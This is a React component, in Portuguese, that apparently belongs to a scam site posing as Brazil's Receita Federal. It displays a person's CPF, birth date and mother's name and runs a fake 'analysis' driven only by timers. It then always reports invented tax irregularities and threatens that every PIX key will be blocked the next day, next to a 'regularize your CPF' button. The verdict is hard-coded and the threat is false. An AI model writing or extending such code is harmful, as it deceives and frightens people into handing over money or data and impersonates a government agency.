
import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { User, IdCard, Calendar, FileText, ArrowLeft, CheckCircle, AlertTriangle } from "lucide-react";
import { toast } from 'sonner';

const UserData: React.FC = () => {
  const [userData, setUserData] = useState<any>(null);
  const [loading, setLoading] = useState<boolean>(false);
  const [showVerification, setShowVerification] = useState<boolean>(false);
  const [analysisComplete, setAnalysisComplete] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  useEffect(() => {
    // Get stored user data from state
    if (location.state && location.state.userData) {
      setUserData(location.state.userData);
    } else {
      // If no data, redirect back to home
      toast.error("Nenhum dado encontrado. Por favor, faça a consulta novamente.");
      navigate('/');
    }
  }, [location.state, navigate]);

  // Format birth date to Brazilian format
  const formatDate = (dateString: string) => {
    if (!dateString) return null;
    const date = new Date(dateString);
    return date.toLocaleDateString('pt-BR');
  };

  const handleConfirmData = () => {
    setShowVerification(true);
    
    // Simulating analysis steps with timeouts
    const steps = [
      "Iniciando análise do CPF...",
      "Analisando transferências PIX desde 2019...",
      "Verificando movimentações financeiras desde 2020...",
      "Consultando declarações de Imposto de Renda...",
      "Analisando registros de Cartão de Crédito...",
      "Verificando histórico de declarações tributárias...",
      "Consultando lista de restrições da Receita Federal..."
    ];
    
    setLoading(true);
    
    // Simulate the analysis process
    let currentStep = 0;
    const processStep = () => {
      if (currentStep < steps.length) {
        toast.info(steps[currentStep]);
        currentStep++;
        setTimeout(processStep, 1500 + Math.random() * 500);
      } else {
        setLoading(false);
        setAnalysisComplete(true);
      }
    };
    
    processStep();
  };

  const handleRegularize = () => {
    toast.info("Funcionalidade de regularização ainda não implementada.");
  };

  const handleGoBack = () => {
    navigate('/');
  };

  if (!userData) {
    return (
      <div className="flex justify-center items-center h-screen">
        <p>Carregando dados...</p>
      </div>
    );
  }

  return (
    <div className="container max-w-xl mx-auto p-6">
      <div className="glass-card rounded-xl p-8 animate-fade-in">
        {!showVerification ? (
          <>
            <h2 className="font-heading text-xl font-semibold text-gray-800 mb-6">
              Dados do Contribuinte
            </h2>
            
            <div className="space-y-4 mb-8">
              <div className="flex items-center border-b border-gray-200 py-3">
                <User className="h-5 w-5 text-govblue-600 mr-3" />
                <div>
                  <div className="text-sm text-gray-500">Nome Completo</div>
                  <div className="font-medium">{userData.nome}</div>
                </div>
              </div>
              
              <div className="flex items-center border-b border-gray-200 py-3">
                <IdCard className="h-5 w-5 text-govblue-600 mr-3" />
                <div>
                  <div className="text-sm text-gray-500">CPF</div>
                  <div className="font-medium">{userData.cpf}</div>
                </div>
              </div>
              
              {userData.data_nascimento && (
                <div className="flex items-center border-b border-gray-200 py-3">
                  <Calendar className="h-5 w-5 text-govblue-600 mr-3" />
                  <div>
                    <div className="text-sm text-gray-500">Data de Nascimento</div>
                    <div className="font-medium">{formatDate(userData.data_nascimento)}</div>
                  </div>
                </div>
              )}
              
              {userData.nome_mae && (
                <div className="flex items-center border-b border-gray-200 py-3">
                  <FileText className="h-5 w-5 text-govblue-600 mr-3" />
                  <div>
                    <div className="text-sm text-gray-500">Nome da Mãe</div>
                    <div className="font-medium">{userData.nome_mae}</div>
                  </div>
                </div>
              )}
            </div>
            
            <div className="flex space-x-4">
              <Button
                variant="outline"
                className="flex-1"
                onClick={handleGoBack}
              >
                <ArrowLeft className="mr-2 h-4 w-4" />
                Voltar
              </Button>
              
              <Button
                className="gov-button flex-1 rounded-full"
                onClick={handleConfirmData}
              >
                <CheckCircle className="mr-2 h-4 w-4" />
                Confirmar meus dados
              </Button>
            </div>
          </>
        ) : analysisComplete ? (
          <>
            <h2 className="font-heading text-xl font-semibold text-red-600 mb-6">
              Pendências Identificadas
            </h2>
            
            <div className="mb-4">
              <div className="text-sm font-medium">Nome: {userData.nome}</div>
              <div className="text-sm font-medium">CPF: {userData.cpf}</div>
            </div>
            
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
              <div className="font-medium text-red-700 mb-2">Pendências identificadas junto à Receita Federal:</div>
              
              <div className="mb-3">
                <strong>Ano 2023</strong>
                <div className="mt-1 text-sm">
                  • Divergências na declaração de renda<br />
                  • Inconsistências nos valores declarados
                </div>
              </div>
              
              <div>
                <strong>Ano 2024</strong>
                <div className="mt-1 text-sm">
                  • Movimentações financeiras incompatíveis<br />
                  • Transações não declaradas identificadas
                </div>
              </div>
            </div>
            
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6 text-sm">
              <p className="text-yellow-800">
                Comunicamos que, devido às irregularidades identificadas, o contribuinte estará na 
                Lista de Bloqueio da Receita Federal a partir de {
                  new Date(new Date().setDate(new Date().getDate() + 1)).toLocaleDateString('pt-BR')
                }. 
                Todas as chaves PIX serão bloqueadas, impossibilitando a realização e recebimento de transferências via PIX.
              </p>
            </div>
            
            <Button 
              className="w-full bg-red-600 hover:bg-red-700 rounded-full"
              onClick={handleRegularize}
            >
              <AlertTriangle className="mr-2 h-4 w-4" />
              Regularizar meu CPF
            </Button>
          </>
        ) : (
          <div className="text-center py-10">
            <h3 className="text-govblue-700 font-medium mb-6">Análise em andamento...</h3>
            <div className="flex justify-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-govblue-600"></div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default UserData;
